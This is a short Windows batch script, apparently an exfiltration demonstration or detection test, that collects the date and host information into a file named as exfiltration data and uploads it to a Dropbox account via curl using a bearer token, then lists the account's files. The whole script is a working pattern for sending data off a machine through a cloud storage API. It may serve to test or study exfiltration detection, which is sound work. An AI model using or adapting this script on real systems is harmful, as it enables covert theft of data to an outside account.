set DROPBOX_ACCESS_TOKEN="REDACTED"

curl -X POST "https://api.dropboxapi.com/2/users/get_current_account" --header "Authorization: Bearer %DROPBOX_ACCESS_TOKEN%"

set UNIQUE_UPLOAD_FILENAME="example_exfilration_data.txt"
date > "%UNIQUE_UPLOAD_FILENAME%"
host >> "%UNIQUE_UPLOAD_FILENAME%"

REM upload the file
curl -X POST https://content.dropboxapi.com/2/files/upload  --header "Authorization: Bearer %DROPBOX_ACCESS_TOKEN%" --header "Dropbox-API-Arg: {\"autorename\":false,\"mode\":\"add\",\"mute\":false,\"path\":\"/%UNIQUE_UPLOAD_FILENAME%\",\"strict_conflict\":false}"  --header "Content-Type: application/octet-stream" --data-binary @"%UNIQUE_UPLOAD_FILENAME%"

REM list files in root folder
curl -X POST https://api.dropboxapi.com/2/files/list_folder --header "Authorization: Bearer %DROPBOX_ACCESS_TOKEN%" --header "Content-Type: application/json" --data "{\"include_deleted\":false,\"include_has_explicit_shared_members\":false,\"include_media_info\":false,\"include_mounted_folders\":true,\"include_non_downloadable_files\":true,\"path\":\"\",\"recursive\":false}"
